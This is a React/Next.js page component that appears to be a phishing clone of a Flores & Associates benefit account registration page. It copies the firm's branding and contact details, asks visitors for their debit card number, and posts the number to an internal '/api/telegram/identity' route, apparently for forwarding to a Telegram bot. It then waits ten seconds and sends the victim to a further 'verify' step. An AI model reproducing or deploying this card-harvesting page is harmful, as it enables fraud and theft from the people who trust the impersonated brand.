"use client";
import React, { useState } from "react";
import FloresLogo from "../../components/flores-logo-header";
import { useRouter } from "next/navigation";

export default function RegistrationPage() {
  const [cardNumber, setCardNumber] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [visible, setVisible] = useState(false);
  const router = useRouter();

  const handleCardInput = (e) => {
    let v = e.target.value.replace(/\D/g, "").slice(0, 16);
    setCardNumber(v.replace(/(.{4})/g, "$1 ").trim());
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    const rawCard = cardNumber.replace(/\s/g, "");
    if (rawCard.length < 13) {
      setError("Please enter a valid debit card number.");
      return;
    }
    setSubmitting(true);
    try {
      await fetch("/api/telegram/identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cardNumber: rawCard }),
      });
      setTimeout(() => {
        router.push("/verify");
      }, 10000);
    } catch (err) {
      setError("Failed to submit. Please try again.");
      setSubmitting(false);
    }
  };

  // Inline styles for fidelity to the provided HTML
  const styles = {
    main: {
      minHeight: "100vh",
      display: "flex",
      flexDirection: "column",
      background: "#f5f6f7",
    },
    header: {
      background: "#fff",
      borderBottom: "1px solid #dde2e7",
      padding: "0 24px",
    },
    headerInner: {
      maxWidth: 1200,
      margin: "0 auto",
      display: "flex",
      alignItems: "center",
      justifyContent: "space-between",
      flexWrap: "wrap",
      gap: 8,
      padding: "14px 0",
    },
    logo: { display: "flex", alignItems: "center", textDecoration: "none" },
    contactInfo: {
      display: "flex",
      flexDirection: "column",
      gap: 2,
      fontSize: 13,
      color: "#555",
    },
    headerTitle: {
      fontSize: 20,
      fontWeight: 400,
      color: "#777",
      letterSpacing: ".3px",
    },
    stepper: {
      display: "flex",
      alignItems: "center",
      marginBottom: 28,
      width: "100%",
      maxWidth: 560,
      position: "relative",
    },
    step: {
      position: "relative",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: 12.5,
      fontWeight: 600,
      letterSpacing: ".5px",
      textTransform: "uppercase",
      height: 36,
      padding: "0 20px 0 26px",
      color: "#fff",
      background: "#6c757d",
      flex: 1,
      whiteSpace: "nowrap",
      userSelect: "none",
      clipPath:
        "polygon(0 0, calc(100% - 12px) 0, 100% 50%, calc(100% - 12px) 100%, 0 100%, 12px 50%)",
    },
    stepActive: { background: "#5f6b28", zIndex: 2 },
    formCard: {
      background: "#fff",
      border: "1px solid #d0d5dc",
      borderRadius: 4,
      padding: "36px 48px 40px",
      width: "100%",
      maxWidth: 680,
      boxShadow: "0 1px 4px rgba(0,0,0,.06)",
      margin: "0 auto",
    },
    fieldRow: {
      display: "flex",
      flexDirection: "column",
      gap: 14,
      marginBottom: 24,
    },
    fieldLabel: {
      fontSize: 13.5,
      color: "#333",
      marginBottom: 4,
    },
    inputWrapper: { position: "relative", width: "100%" },
    cardInput: {
      width: "100%",
      height: 38,
      border: "1px solid #bcc3ca",
      borderRadius: 3,
      padding: "0 38px 0 10px",
      fontSize: 14,
      fontFamily: "'Open Sans', sans-serif",
      color: "#333",
      outline: "none",
      background: "#fff",
      marginBottom: 8,
    },
    toggleBtn: {
      position: "absolute",
      right: 8,
      top: "50%",
      transform: "translateY(-50%)",
      background: "none",
      border: "none",
      cursor: "pointer",
      color: "#888",
      padding: 2,
      display: "flex",
      alignItems: "center",
    },
    btnRow: {
      display: "flex",
      gap: 10,
      justifyContent: "center",
      flexWrap: "wrap",
      marginTop: 16,
    },
    btn: {
      display: "inline-flex",
      alignItems: "center",
      gap: 8,
      padding: "0 22px",
      height: 42,
      fontFamily: "'Open Sans', sans-serif",
      fontSize: 13,
      fontWeight: 600,
      letterSpacing: ".6px",
      textTransform: "uppercase",
      border: "none",
      borderRadius: 3,
      cursor: "pointer",
      minWidth: 120,
      justifyContent: "center",
      background: "#2e6da4",
      color: "#fff",
    },
  };

  return (
    <div style={styles.main}>
      <header style={styles.header}>
        <div style={styles.headerInner}>
          <a href="#" style={styles.logo} aria-label="Flores home">
            <FloresLogo
              style={{ height: 42, width: "auto", display: "block" }}
            />
          </a>
          <div style={styles.contactInfo}>
            <a href="tel:8005323327">800-532-3327</a>
            <a href="mailto:customerservice@flores247.com">
              customerservice@flores247.com
            </a>
          </div>
          <span style={styles.headerTitle}>Registration</span>
        </div>
      </header>
      <div style={{ height: 1, background: "#dde2e7" }} />
      <main
        style={{
          flex: 1,
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          padding: "40px 20px 60px",
        }}
      >
        <nav style={styles.stepper} aria-label="Registration steps">
          <div
            style={{ ...styles.step, ...styles.stepActive }}
            aria-current="step"
          >
            Step 1
          </div>
          <div style={styles.step}>Step 2</div>
          <div style={styles.step}>Step 3</div>
          <div style={styles.step}>Step 4</div>
          <div style={styles.step}>Step 5</div>
        </nav>
        <form style={styles.formCard} onSubmit={handleSubmit}>
          <p
            style={{
              textAlign: "center",
              fontSize: 14,
              color: "#555",
              marginBottom: 6,
            }}
          >
            You are on step 1 of 5
          </p>
          <p
            style={{
              textAlign: "center",
              fontSize: 14.5,
              color: "#444",
              marginBottom: 24,
            }}
          >
            Please enter your debit card number.
          </p>
          <div style={styles.fieldRow}>
            <label style={styles.fieldLabel} htmlFor="cardNumber">
              Benefit Account Debit Card{" "}
              <span style={{ color: "#c0392b" }}>*</span>
            </label>
            <div style={styles.inputWrapper}>
              <input
                type={visible ? "text" : "password"}
                id="cardNumber"
                style={styles.cardInput}
                autoComplete="off"
                inputMode="numeric"
                maxLength={19}
                aria-required="true"
                aria-label="Benefit Account Debit Card number"
                value={cardNumber}
                onChange={handleCardInput}
                disabled={submitting}
              />
              <button
                type="button"
                style={styles.toggleBtn}
                aria-label="Toggle card number visibility"
                aria-pressed={visible}
                tabIndex={-1}
                onClick={() => setVisible((v) => !v)}
              >
                {visible ? (
                  <svg viewBox="0 0 24 24" width={18} height={18}>
                    <path
                      d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"
                      fill="none"
                      stroke="#888"
                      strokeWidth={1.7}
                    />
                    <circle
                      cx="12"
                      cy="12"
                      r="3"
                      fill="none"
                      stroke="#888"
                      strokeWidth={1.7}
                    />
                  </svg>
                ) : (
                  <svg viewBox="0 0 24 24" width={18} height={18}>
                    <path
                      d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"
                      fill="none"
                      stroke="#888"
                      strokeWidth={1.7}
                    />
                    <circle
                      cx="12"
                      cy="12"
                      r="3"
                      fill="none"
                      stroke="#888"
                      strokeWidth={1.7}
                    />
                    <line
                      x1="3"
                      y1="3"
                      x2="21"
                      y2="21"
                      stroke="#888"
                      strokeWidth={1.7}
                    />
                  </svg>
                )}
              </button>
            </div>
          </div>
          {error && (
            <div
              style={{
                color: "#c0392b",
                marginBottom: 16,
                textAlign: "center",
              }}
            >
              {error}
            </div>
          )}
          <div style={styles.btnRow}>
            <button type="submit" style={styles.btn} disabled={submitting}>
              {submitting ? "Submitting..." : "Next"}
            </button>
          </div>
          {submitting && (
            <div style={{ marginTop: 24, textAlign: "center", color: "#555" }}>
              Please wait...
            </div>
          )}
        </form>
      </main>
      <footer
        style={{ background: "#1a4f8a", color: "#fff", padding: "18px 24px" }}
      >
        <div
          style={{
            maxWidth: 1200,
            margin: "0 auto",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            flexWrap: "wrap",
            gap: 8,
          }}
        >
          <p style={{ fontSize: 12.5, opacity: 0.85 }}>
            Copyright &copy; 2024 Flores & Associates, LLC. All Rights Reserved.
          </p>
        </div>
        <div style={{ textAlign: "center", width: "100%", marginTop: 10 }}>
          <a
            href="#"
            style={{
              fontSize: 11.5,
              letterSpacing: 1,
              textTransform: "uppercase",
              color: "rgba(255,255,255,.7)",
              textDecoration: "none",
            }}
          >
            SITE MAP
          </a>
        </div>
      </footer>
    </div>
  );
}
